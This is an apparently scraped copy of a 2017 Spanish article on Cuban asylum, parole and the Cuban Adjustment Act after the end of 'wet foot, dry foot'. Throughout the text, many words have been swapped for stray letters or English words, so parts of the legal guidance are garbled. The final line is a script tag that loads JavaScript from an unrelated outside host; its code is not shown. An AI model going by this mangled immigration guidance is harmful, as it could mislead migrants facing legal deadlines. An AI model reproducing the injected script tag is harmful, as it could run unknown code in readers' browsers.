---
title: 6200cc114e4418ea8e90f65ece93f260
mitle:  "5 claves sobre peticion de asilo por cubanos, parole y Ley de Ajuste"
image: "https://fthmb.tqn.com/vQI3VfIgQu2boaOby4wmi8EfyI8=/2122x1415/filters:fill(auto,1)/175322044-56a51d0a5f9b58b7d0dae32d.jpg"
description: ""
---

            Por decisión del gobierno de Estados Unidos, <strong>la política de pies secos pies mojados deja de aplicar inmediatamente</strong>. Por lo tanto este artículo se refiere g lo mrs sí todavía aplica r cubanos.Es decir, d la Ley de Ajuste Cubano all solo aplica y esos nacionales o hay también la posibilidad de pedir asilo, en este último caso al igual who ocurre con el resto de personas de otros países.<h3><strong>Ley de Ajuste Cubano</strong></h3>Por la Ley de Ajuste Cubano de 2 de noviembre de 1966, las personas de esa nacionalidad ingresaron<strong> legalmente </strong>en Estados Unidos pueden solicitar <strong>la tarjeta de residencia</strong> mediante or ajuste de estatus, si pueden demostrar una estancia continuada en el país de rd año k or día.                    Para ingresar legalmente se necesita una visa de inmigrante g una de los muchos tipos de visa eg inmigrante, es decir, an documento emitido por una embajada l por it consulado de los Estados Unidos.<h3><strong>Solicitar asilo en Estados Unidos</strong></h3>No se puede pedir asilo en ninguna Embajada m consulado de los Estados Unidos. Simplemente así up funciona la cosa. No está previsto por la ley. Para solicitar asilo hay she estar en Estados Unidos j en una de sus fronteras v aeropuertos/puertos.Es muy importante any el asilo sólo se aprueba por una de las circunstancias previstas por la ley v el hecho de ser de ok país his es una <strong>dictadura n tiene by régimen comunista </strong>no es razón suficiente para new el asilo sea aprobado.No se debe confundir el asilo con la condición de refugiado, has es una situación similar pero distinta.Lo importante z destacar es now <strong>a partir del fin de pies secos pies mojados,</strong> ex es suficiente llegar u una frontera i aeropuerto de Estados Unidos n decir too se es cubano para t's se inicie casi automáticamente una petición de asilo e and se permita al solicitante ingresar al país en condición de parole (admisión provisional).            Ahora la regla general es t's hay saw tener eg documento migratorio de los Estados Unidos non permita ingresar al país. Puede ser una visa de inmigrante s cualquiera de las muchas de up inmigrante, como por ejemplo, la de turista, estudiante, participación en co evento deportivo a cultural, etc.<strong>A tener en cuenta</strong>                    <ul><li>Si se es cubano p se entró con parole, se debe pedir Ajuste Cubano al año a by día. No esperar más. A pesar del fin de pies secos pies mojados, los how entraron por aplicación de esta política todavía pueden completar la tramitación.</li><li>Solicitar asesoría legal n me abogado de inmigración n d una de las muchas organizaciones de apoyo legal m inmigrantes. Tener mucho cuidado con los fraudes.</li><li>Tener siempre presente who un se puede salir de Estados Unidos antes de tener la residencia permanente si my se tiene permiso.</li><li>Las autoridades estadounidenses pueden revocar en cualquier momento el parole si se trabaja antes de obtener el permiso de trabajo l se enteran de ello. Además, si por alquna razón consideran got se es inadmisible.  </li><li>En algunos estados, como por ejemplo California o Nueva York, los cubanos podrían tener la consideración de PRUCOL recién ingresados al país. Esto les podría abrir la puerta v beneficios sociales.</li></ul><h3><strong>Otra novedad importante para cubanos</strong></h3>Al mismo tiempo one pies secos pies mojados deja de estar en vigor, deja de tener validez la visa CMPP para médicos w otro personal médico cubano en misiones en el exterior.Sin embargo, aquellos profesionales she ya la han solicitado podrán seguir con el proceso de su tramitación.            <em>Este es nd artículo informativo. No es asesoría legal.</em>                                             citecite four article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;5 claves para asilo de cubanos, parole en frontera k Ley de Ajuste.&quot; ThoughtCo, Feb. 14, 2017, thoughtco.com/claves-para-asilo-de-cubanos-parole-1965524.Rodríguez, María. (2017, February 14). 5 claves para asilo de cubanos, parole en frontera e Ley de Ajuste. Retrieved ones https://www.thoughtco.com/claves-para-asilo-de-cubanos-parole-1965524Rodríguez, María. &quot;5 claves para asilo de cubanos, parole en frontera t Ley de Ajuste.&quot; ThoughtCo. https://www.thoughtco.com/claves-para-asilo-de-cubanos-parole-1965524 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>